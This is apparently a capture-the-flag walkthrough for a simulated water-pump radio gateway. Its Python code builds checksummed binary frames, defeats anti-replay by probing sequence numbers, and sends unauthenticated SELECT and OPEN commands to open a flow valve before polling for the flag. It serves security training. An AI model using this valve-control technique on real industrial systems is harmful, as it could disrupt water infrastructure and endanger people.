# Challenge 4 — Rogue Radio

**Protocol:** Pump-bus radio gateway (custom binary over TCP) · **Port:** 7700 · **Toolkit module:** none — custom client required

---

## The Story

The flow-control pump bus still runs over the old radio gateway, bridged onto the network as a custom binary protocol on `10.0.1.1:7700` — no authentication at all. Pump & Water I&C saved a capture of normal traffic that shows the frame format, the checksum rule, which feeder is the real flow valve versus the decoys, and the anti-replay behavior: a byte-for-byte replay of a captured frame is rejected, so you have to craft a fresh, higher-sequence SELECT followed by an OPEN.

## What You Know

- Target: `10.0.1.1:7700`, no auth
- A saved capture (`pump_capture.txt`) shows the frame format, the checksum rule, which feeder is the real flow valve vs. the decoys, and that replayed frames are rejected
- Frames carry a running sequence byte; a byte-for-byte replay is rejected, so each attempt needs a fresh, higher sequence number
- The status/flag block reads back on the **same** socket, using action byte `0x05` (target = word index) and the same frame shape as a command. It reads zero until the target valve has actually been selected, opened, and held open

## Step 1: Work out the frame format from the capture

<details>
<summary>Hint</summary>

Before sending anything, read `pump_capture.txt` and work out the frame layout: a fixed 2-byte sync, a version byte, a sequence byte, a feeder/target byte, an action byte, a reserved byte, and a trailing checksum byte. Figure out how that checksum is computed — it's a simple one.

</details>

<details>
<summary>Show command</summary>

```python
def checksum(b):
    return sum(b) & 0xFF

def frame(seq, feeder, action):
    body = bytes([0x50, 0x55, 0x01, seq, feeder, action, 0x00])
    return body + bytes([checksum(body)])
```

</details>

## Step 2: Identify the real feeder among the decoys

<details>
<summary>Hint</summary>

The capture shows several feeder IDs being polled, but only one of them is the real flow valve — the rest are decoys that ack the same way without gating anything. Cross-reference which feeder ID the capture actually ties to the flow-control valve rather than guessing.

</details>

<details>
<summary>Show command</summary>

```python
# From pump_capture.txt: feeder 0x07 is the real flow valve.
feeder = 0x07
```

</details>

## Step 3: Find a sequence number the gateway will accept

<details>
<summary>Hint</summary>

Replaying the exact sequence number from the capture gets rejected — the gateway has already seen it. Probe upward from the last sequence number in the capture until a SELECT gets acked. An ack starts with the same two sync bytes followed by a status byte of `0x00`.

</details>

<details>
<summary>Show command</summary>

```python
import socket, time

HOST, PORT = "10.0.1.1", 7700
s = socket.create_connection((HOST, PORT))

def send_and_check(seq, feeder, action):
    f = frame(seq, feeder, action)
    s.sendall(f)
    resp = s.recv(64)
    print(f.hex(), "->", resp.hex())
    return resp[:3] == bytes([0x50, 0x55, 0x00])  # True = acked

SELECT = 0x01
seq = 0xEC  # next sequence after the last one seen in the capture
while not send_and_check(seq, feeder, SELECT):
    seq += 1
    if seq > 0xFF:
        seq = 0x00  # wrap if it's a single-byte counter
    time.sleep(0.05)

print("SELECT acked at seq", hex(seq))
```

</details>

## Step 4: OPEN the valve with the next sequence number

<details>
<summary>Hint</summary>

SELECT alone just arms the valve — it doesn't move it. Immediately follow with an OPEN using the **next** sequence number. The gateway expects a strictly increasing sequence, not a repeat of the one that just worked.

</details>

<details>
<summary>Show command</summary>

```python
OPEN = 0x02
seq += 1
if seq > 0xFF:
    seq = 0x00

opened = send_and_check(seq, feeder, OPEN)
print("OPEN acked:", opened)
```

</details>

## Step 5: Poll the status block until it reports open

<details>
<summary>Hint</summary>

The flag isn't in the OPEN response itself — it's read back separately, using action byte `0x05` with the feeder/target byte set to the same word index. It reads zero until the valve is actually selected, opened, and **held** open, so poll it instead of reading once.

</details>

<details>
<summary>Show command</summary>

```python
STATUS = 0x05

while True:
    seq += 1
    if seq > 0xFF:
        seq = 0x00
    f = frame(seq, feeder, STATUS)
    s.sendall(f)
    resp = s.recv(64)
    print(f.hex(), "->", resp.hex())
    if resp[:3] == bytes([0x50, 0x55, 0x00]) and any(resp[3:-1]):
        print("FLAG bytes:", resp[3:-1])
        break
    time.sleep(0.2)
```

</details>

## What You Learned

A checksum and a monotonically increasing sequence number stop naive byte-for-byte replay, but they don't stop you from deriving a valid frame yourself once you understand the format — you just need a sequence number the gateway hasn't consumed yet. Splitting "select/open" commands from a separate "read status" command on the same socket is a common real-world pattern (select-before-operate, as used in real SCADA systems), and it means the interesting read often isn't the ack to your command at all, but a second, differently-coded poll that has to catch the valve in its held-open state.
